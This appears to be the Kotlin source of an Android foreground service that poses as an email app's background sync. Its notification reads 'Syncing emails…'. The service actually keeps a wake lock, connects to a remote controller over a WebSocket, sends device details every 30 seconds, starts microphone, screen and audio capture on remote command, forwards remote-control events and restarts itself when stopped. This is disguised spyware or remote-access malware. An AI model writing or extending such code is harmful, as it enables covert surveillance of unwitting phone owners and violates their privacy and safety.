package com.email.service

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import com.email.MainActivity
import com.email.R
import com.email.util.DeviceInfoUtil
import kotlinx.coroutines.*

class RemoteMonitorService : Service() {

    companion object {
        const val ACTION_START_SCREEN = "START_SCREEN"
        const val ACTION_STOP_SCREEN = "STOP_SCREEN"
        const val ACTION_START_MIC = "START_MIC"
        const val ACTION_STOP_MIC = "STOP_MIC"
        const val ACTION_START_AUDIO = "START_AUDIO"
        const val ACTION_STOP_AUDIO = "STOP_AUDIO"
        const val ACTION_CONNECT = "CONNECT"

        private const val CHANNEL_ID = "email_sync_channel"
        private const val NOTIFICATION_ID = 1001
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var prefs: SharedPreferences
    private lateinit var wsManager: WebSocketManager
    private var wakeLock: PowerManager.WakeLock? = null
    private var deviceInfoJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        prefs = getSharedPreferences("email_prefs", Context.MODE_PRIVATE)
        wsManager = WebSocketManager.getInstance()

        acquireWakeLock()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
        initWebSocket()
        startPeriodicDeviceInfo()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_SCREEN -> {
                // ScreenCaptureService needs a MediaProjection token from an Activity —
                // send broadcast so controller can re-request if needed
                broadcastCommand("REQUEST_SCREEN_PERMISSION")
            }
            ACTION_STOP_SCREEN -> {
                stopService(Intent(this, ScreenCaptureService::class.java))
            }
            ACTION_START_MIC -> {
                val micIntent = Intent(this, MicrophoneService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(micIntent)
                } else {
                    startService(micIntent)
                }
            }
            ACTION_STOP_MIC -> {
                stopService(Intent(this, MicrophoneService::class.java))
            }
            ACTION_START_AUDIO -> {
                broadcastCommand("REQUEST_AUDIO_PERMISSION")
            }
            ACTION_STOP_AUDIO -> {
                stopService(Intent(this, DeviceAudioService::class.java))
            }
            ACTION_CONNECT -> {
                wsManager.connect()
            }
        }
        return START_STICKY
    }

    private fun initWebSocket() {
        wsManager.apply {
            deviceId = prefs.getString("device_id", "unknown") ?: "unknown"
            fcmToken = prefs.getString("fcm_token", "") ?: ""
        }

        // Populate device info fields
        val info = DeviceInfoUtil.collectAsJson(applicationContext)
        scope.launch {
            try {
                val json = org.json.JSONObject(info)
                wsManager.deviceName = json.optString("deviceName", Build.MODEL)
                wsManager.model = json.optString("model", Build.MODEL)
                wsManager.androidVersion = json.optString("androidVersion", Build.VERSION.RELEASE)
                wsManager.battery = json.optInt("batteryLevel", 0)
                wsManager.storage = json.optString("availableStorage", "0")
            } catch (_: Exception) {}
        }

        wsManager.onControlEvent = { json ->
            RemoteControlService.handleControlJson(applicationContext, json)
        }

        wsManager.connect()
    }

    private fun startPeriodicDeviceInfo() {
        deviceInfoJob = scope.launch {
            while (isActive) {
                delay(30_000)
                try {
                    val json = DeviceInfoUtil.collectAsJson(applicationContext)
                    wsManager.sendDeviceInfo(json)
                } catch (_: Exception) {}
            }
        }
    }

    private fun broadcastCommand(command: String) {
        val intent = Intent("com.email.COMMAND").apply {
            putExtra("command", command)
            setPackage(packageName)
        }
        sendBroadcast(intent)
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "email::MonitorWakeLock"
        ).apply { acquire(10 * 60 * 1000L) }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Email Sync",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Keeps email synced in the background"
                setShowBadge(false)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification() = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("Email")
        .setContentText("Syncing emails…")
        .setSmallIcon(android.R.drawable.ic_dialog_email)
        .setPriority(NotificationCompat.PRIORITY_LOW)
        .setOngoing(true)
        .setContentIntent(
            PendingIntent.getActivity(
                this, 0,
                Intent(this, MainActivity::class.java),
                PendingIntent.FLAG_IMMUTABLE
            )
        )
        .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        deviceInfoJob?.cancel()
        scope.cancel()
        wakeLock?.release()
        wsManager.disconnect()
        super.onDestroy()

        // Self-restart
        val restartIntent = Intent(applicationContext, RemoteMonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent)
        } else {
            startService(restartIntent)
        }
    }
}
